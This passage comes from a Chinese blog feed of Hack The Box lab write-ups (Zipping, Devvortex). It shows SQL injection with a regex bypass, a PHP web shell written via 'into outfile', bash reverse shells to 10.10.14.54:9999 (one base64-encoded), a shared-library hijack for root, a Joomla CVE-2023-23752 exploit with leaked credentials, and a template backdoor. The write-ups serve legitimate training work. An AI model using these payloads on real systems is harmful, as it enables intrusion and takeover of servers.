&lt;a href=&quot;index.php?page=cart&amp;remove=&lt;?=$product[&#x27;id&#x27;]?&gt;&quot; class=&quot;remove&quot;&gt;Remove&lt;/a&gt;</span><br><span class=\"line\">                    &lt;/td&gt;</span><br><span class=\"line\">                    &lt;td class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$product[&#x27;price&#x27;]?&gt;&lt;/td&gt;</span><br><span class=\"line\">                    &lt;td class=&quot;quantity&quot;&gt;</span><br><span class=\"line\">                        &lt;input type=&quot;number&quot; name=&quot;quantity-&lt;?=$product[&#x27;id&#x27;]?&gt;&quot; value=&quot;&lt;?=$products_in_cart[$product[&#x27;id&#x27;]]?&gt;&quot; min=&quot;1&quot; max=&quot;&lt;?=$product[&#x27;quantity&#x27;]?&gt;&quot; placeholder=&quot;Quantity&quot; required&gt;</span><br><span class=\"line\">                    &lt;/td&gt;</span><br><span class=\"line\">                    &lt;td class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$product[&#x27;price&#x27;] * $products_in_cart[$product[&#x27;id&#x27;]]?&gt;&lt;/td&gt;</span><br><span class=\"line\">                &lt;/tr&gt;</span><br><span class=\"line\">                &lt;?php endforeach; ?&gt;</span><br><span class=\"line\">                &lt;?php endif; ?&gt;</span><br><span class=\"line\">            &lt;/tbody&gt;</span><br><span class=\"line\">        &lt;/table&gt;</span><br><span class=\"line\">        &lt;div class=&quot;subtotal&quot;&gt;</span><br><span class=\"line\">            &lt;span class=&quot;text&quot;&gt;Subtotal&lt;/span&gt;</span><br><span class=\"line\">            &lt;span class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$subtotal?&gt;&lt;/span&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">        &lt;div class=&quot;buttons&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Update&quot; name=&quot;update&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Place Order&quot; name=&quot;placeorder&quot;&gt;</span><br><span class=\"line\">\t    &lt;input type=&quot;submit&quot; value=&quot;Clear&quot; name=&quot;clear&quot; onsubmit=&quot;&quot;&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/form&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=template_footer()?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"代码审计\"><a class=\"anchor\" href=\"#代码审计\">#</a> 代码审计</h4>\n<p>通过观察代码可以得知</p>\n<p>product.php 代码中执行 sql 语句时使用了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM products WHERE id = &#x27;$id&#x27;&quot;);</span><br></pre></td></tr></table></figure></p>\n<p>将代码预编译了 sql 语句</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL预编译是指在执行SQL语句之前，将参数送到数据库预编译，编译完成后，将验证后的SQL语句发送到数据库进行执行。 这种方法可以有效地防止SQL注入攻击，因为攻击者不能通过注入代码来修改或者干扰SQL预编译中的语句。</span><br></pre></td></tr></table></figure></p>\n<p>而 cart.php 中是直接写入的 sql 语法</p>\n<p>所以能导致 sql 注入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;SELECT * FROM products WHERE id = &#x27;&quot; . $_POST[&#x27;product_id&#x27;] . &quot;&#x27;&quot;;</span><br><span class=\"line\">$product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);</span><br></pre></td></tr></table></figure></p>\n<p>但是它的前面使用了不少过滤</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;\\[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]/i&quot;, $quantity, $match)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;\\[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]|[^0-9]$</span><br><span class=\"line\">这个正则的话前面的^.*可以使用%0a绕过</span><br><span class=\"line\">然后后面的$只是匹配个数字而已后面直接加上</span><br></pre></td></tr></table></figure></p>\n<p>先构造好思路，首先利用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shop/index.php?page=</span><br></pre></td></tr></table></figure></p>\n<p>能达到文件任意读取，</p>\n<p>在通过 shop/cart.php 来进行上传马儿</p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>经过测试发现都不能写入木马，最后看别人 wp 用 into outfile 写到 /var/lib/mysql 里面去就行了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /shop/index.php?page=cart HTTP/1.1</span><br><span class=\"line\"> </span><br><span class=\"line\">Host: 10.10.11.229</span><br><span class=\"line\"> </span><br><span class=\"line\">Content-Length: 113</span><br><span class=\"line\"> </span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\"> </span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"> </span><br><span class=\"line\">Origin: http://10.10.11.229</span><br><span class=\"line\"> </span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\"> </span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span><br><span class=\"line\"> </span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\"> </span><br><span class=\"line\">Referer: http://10.10.11.229/shop/index.php?page=cart</span><br><span class=\"line\"> </span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\"> </span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\"> </span><br><span class=\"line\">Cookie: PHPSESSID=2r2p0aicavvo4ka7ncc5ce1i0a</span><br><span class=\"line\"> </span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">quantity=1&amp;product_id=%0a&#x27;%3bselect+&#x27;&lt;%3fphp+system(&quot;$_POST[1]&quot;)%3b%3f&gt;&#x27;+into+outfile+&#x27;/var/lib/mysql/7.php&#x27;;+--2</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /shop/index.php?page=/var/lib/mysql/7 HTTP/1.1</span><br><span class=\"line\">Host: 10.10.11.229</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=hngopd6tchq7vfp0pfndmd7oq3</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 4</span><br><span class=\"line\"></span><br><span class=\"line\">1=ls</span><br></pre></td></tr></table></figure></p>\n<p>命令执行成功</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Fri, 15 Dec 2023 06:40:57 GMT</span><br><span class=\"line\">Server: Apache/2.4.54 (Ubuntu)</span><br><span class=\"line\">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class=\"line\">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Vary: Accept-Encoding</span><br><span class=\"line\">Content-Length: 89</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/html; charset=UTF-8</span><br><span class=\"line\"></span><br><span class=\"line\">assets</span><br><span class=\"line\">cart.php</span><br><span class=\"line\">functions.php</span><br><span class=\"line\">home.php</span><br><span class=\"line\">index.php</span><br><span class=\"line\">placeorder.php</span><br><span class=\"line\">product.php</span><br><span class=\"line\">products.php</span><br></pre></td></tr></table></figure></p>\n<p>接下来反弹一下 shell</p>\n<p>使用加密后的 bash 反弹一下试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ echo bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1&quot;|base64</span><br><span class=\"line\">YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjU0Lzk5OTkgMD4mMQo=</span><br></pre></td></tr></table></figure></p>\n<p>使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /shop/index.php?page=/var/lib/mysql/7 HTTP/1.1</span><br><span class=\"line\">Host: 10.10.11.229</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=hngopd6tchq7vfp0pfndmd7oq3</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 90</span><br><span class=\"line\"></span><br><span class=\"line\">1=echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjU0Lzk5OTkgMD4mMQo=|base64 -d|bash</span><br></pre></td></tr></table></figure></p>\n<p>得到 shell</p>\n<p>虽然是 1001 但是目录下有 user.txt</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>执行 sudo -l</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo -l</span><br><span class=\"line\">Matching Defaults entries for rektsu on zipping:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User rektsu may run the following commands on zipping:</span><br><span class=\"line\">    (ALL) NOPASSWD: /usr/bin/stock</span><br></pre></td></tr></table></figure></p>\n<p>使用 ltrace -Ss 10000 ./stock</p>\n<p>这个 stock 的调用库竟然使用了 rektsu/.config/libcounter.so 意义很明显了，</p>\n<p>我们直接在.config 下面写一个一样名称的动态链接库</p>\n<p>只要这个动态链接库执行一下 /usr/bin/bash -i 就相当于提权脚本一样</p>\n<p>先写一个 c</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">void __attribute__((constructor)) init() &#123;</span><br><span class=\"line\">    system(&quot;/usr/bin/bash -i&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c –fPIC –shared –o /home/rektsu/.config/libcounter.so *.c</span><br></pre></td></tr></table></figure></p>\n<p>即可提权成功</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Devvortex/",
            "url": "https://lookhui.github.io/HTB-Devvortex/",
            "title": "HTB-Devvortex",
            "date_published": "2023-12-14T08:15:11.000Z",
            "content_html": "<h1 id=\"devvortex\"><a class=\"anchor\" href=\"#devvortex\">#</a> Devvortex</h1>\n<p>本题知识简介</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Joomla未授权访问漏洞(CVE-2023-23752):</span><br><span class=\"line\">适用版本</span><br><span class=\"line\">4.0.0 &lt;= Joomla &lt;= 4.2.7</span><br><span class=\"line\">构造路由</span><br><span class=\"line\">/api/index.php/v1/config/application?public=true</span><br><span class=\"line\"></span><br><span class=\"line\">apport-cli提权</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>使用 nmap 进行扫描同时使用浏览器进行访问</p>\n<p>修改 hosts</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.242 devvortex.htb</span><br></pre></td></tr></table></figure></p>\n<p>然后去扫目录没有什么可用信息</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">********************************************************</span><br><span class=\"line\">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class=\"line\">********************************************************</span><br><span class=\"line\"></span><br><span class=\"line\">Target: http://devvortex.htb/FUZZ</span><br><span class=\"line\">Total requests: 45524</span><br><span class=\"line\"></span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\">ID           Response   Lines    Word       Chars       Payload</span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\"></span><br><span class=\"line\">000000001:   301        7 L      12 W       178 Ch      &quot;images&quot;</span><br><span class=\"line\">000000002:   301        7 L      12 W       178 Ch      &quot;css&quot;</span><br><span class=\"line\">000000004:   301        7 L      12 W       178 Ch      &quot;js&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">Total time: 262.5244</span><br><span class=\"line\">Processed Requests: 5190</span><br><span class=\"line\">Filtered Requests: 5187</span><br><span class=\"line\">Requests/sec.: 19.76958</span><br></pre></td></tr></table></figure></p>\n<p>在去扫描子域名获得子域名</p>\n<p>通过 wfuzz 去扫描子域名</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wfuzz -w 指定字典 -u &quot;http://devvortex.htb&quot; -H &quot;Host:FUZZ.devvortex.htb&quot; --hl 7</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000499:   200        501 L    1581 W     23221 Ch    &quot;dev&quot;</span><br></pre></td></tr></table></figure></p>\n<p>加入 hosts 然后去访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.242 dev.devvortex.htb</span><br></pre></td></tr></table></figure></p>\n<p>nmap 扫描结果如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 16:28 中国标准时间</span><br><span class=\"line\">Nmap scan report for devvortex.htb (10.10.11.242)</span><br><span class=\"line\">Host is up (0.35s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 81.91 seconds</span><br></pre></td></tr></table></figure></p>\n<p>扫描子域名目录</p>\n<p>扫出来了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000001:   301        7 L      12 W       178 Ch      &quot;images&quot;</span><br><span class=\"line\">000000040:   301        7 L      12 W       178 Ch      &quot;modules&quot;</span><br><span class=\"line\">000000033:   301        7 L      12 W       178 Ch      &quot;includes&quot;</span><br><span class=\"line\">000000037:   301        7 L      12 W       178 Ch      &quot;language&quot;</span><br><span class=\"line\">000000026:   301        7 L      12 W       178 Ch      &quot;plugins&quot;</span><br><span class=\"line\">000000013:   301        7 L      12 W       178 Ch      &quot;templates&quot;</span><br><span class=\"line\">000000091:   301        7 L      12 W       178 Ch      &quot;media&quot;</span><br><span class=\"line\">000000006:   200        501 L    1581 W     23221 Ch    &quot;index.php&quot;</span><br><span class=\"line\">000000058:   301        7 L      12 W       178 Ch      &quot;cache&quot;</span><br><span class=\"line\">000000138:   301        7 L      12 W       178 Ch      &quot;tmp&quot;</span><br><span class=\"line\">000000132:   200        29 L     105 W      764 Ch      &quot;robots.txt&quot;</span><br><span class=\"line\">000000151:   301        7 L      12 W       178 Ch      &quot;administrator&quot;</span><br><span class=\"line\">000000201:   200        74 L     540 W      4940 Ch     &quot;README.txt&quot;</span><br><span class=\"line\">000000198:   301        7 L      12 W       178 Ch      &quot;libraries&quot;</span><br><span class=\"line\">000000209:   403        7 L      10 W       162 Ch      &quot;.DS_Store&quot;</span><br><span class=\"line\">000000243:   200        0 L      0 W        0 Ch        &quot;configuration.php&quot;</span><br><span class=\"line\">000000217:   301        7 L      12 W       178 Ch      &quot;components&quot;</span><br><span class=\"line\">000000339:   200        172 L    1008 W     6858 Ch     &quot;htaccess.txt&quot;</span><br><span class=\"line\">000000588:   200        501 L    1581 W     23221 Ch    &quot;home&quot;</span><br><span class=\"line\">000000925:   403        7 L      10 W       162 Ch      &quot;.htpasswd&quot;</span><br><span class=\"line\">000001005:   200        339 L    2968 W     18092 Ch    &quot;LICENSE.txt&quot;</span><br><span class=\"line\">000001109:   301        7 L      12 W       178 Ch      &quot;cli&quot;</span><br><span class=\"line\">000001149:   403        7 L      10 W       162 Ch      &quot;.thumbs&quot;</span><br></pre></td></tr></table></figure></p>\n<p>访问 readme.txt 能够指定服务信息</p>\n<p>访问 robots.txt 得到几个路由</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: /administrator/</span><br><span class=\"line\">Disallow: /api/</span><br><span class=\"line\">Disallow: /bin/</span><br><span class=\"line\">Disallow: /cache/</span><br><span class=\"line\">Disallow: /cli/</span><br><span class=\"line\">Disallow: /components/</span><br><span class=\"line\">Disallow: /includes/</span><br><span class=\"line\">Disallow: /installation/</span><br><span class=\"line\">Disallow: /language/</span><br><span class=\"line\">Disallow: /layouts/</span><br><span class=\"line\">Disallow: /libraries/</span><br><span class=\"line\">Disallow: /logs/</span><br><span class=\"line\">Disallow: /modules/</span><br><span class=\"line\">Disallow: /plugins/</span><br><span class=\"line\">Disallow: /tmp/</span><br></pre></td></tr></table></figure></p>\n<p>访问 /administrator/ 是个登录框需要密码</p>\n<p>那么我们在网上找这个漏洞</p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>并且使用 msfconsole 来打</p>\n<p>use scanner/http/joomla_api_improper_access_checks</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> ID   Super User  Name        Username  Email                Send Email  Register Date    Last Visit Date  Group Names</span><br><span class=\"line\"> --   ----------  ----        --------  -----                ----------  -------------    ---------------  -----------</span><br><span class=\"line\"> 649  *           lewis       lewis     lewis@devvortex.htb  1           2023-09-25 16:4  2023-12-14 08:5  Super Users</span><br><span class=\"line\">                                                                         4:24             8:39</span><br><span class=\"line\"> 650              logan paul  logan     logan@devvortex.htb  0           2023-09-26 19:1                   Registered</span><br><span class=\"line\">                                                                         5:42</span><br><span class=\"line\"></span><br><span class=\"line\">[+] Config JSON saved to /home/iliy/.msf4/loot/20231214171300_default_10.10.11.242_joomla.config_395747.bin</span><br><span class=\"line\">[+] Joomla Config</span><br><span class=\"line\">=============</span><br><span class=\"line\"></span><br><span class=\"line\"> Setting        Value</span><br><span class=\"line\"> -------        -----</span><br><span class=\"line\"> db encryption  0</span><br><span class=\"line\"> db host        localhost</span><br><span class=\"line\"> db name        joomla</span><br><span class=\"line\"> db password    P4ntherg0t1n5r3c0n##</span><br><span class=\"line\"> db prefix      sd4fg_</span><br><span class=\"line\"> db user        lewis</span><br><span class=\"line\"> dbtype         mysqli</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class=\"line\">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></p>\n<p>得到数据库账号和密码</p>\n<p>然后登录点击 system 然后在 templates 的第一个里面修改代码，index.php 只有读取权限写入不了那我们写 error.php 一样的</p>\n<p>写入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1&quot;&#x27;);</span><br></pre></td></tr></table></figure></p>\n<p>然后</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 9999</span><br></pre></td></tr></table></figure></p>\n<p>在根据这个路径进行访问即可得到 shell</p>\n<p>查看一下用户</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span 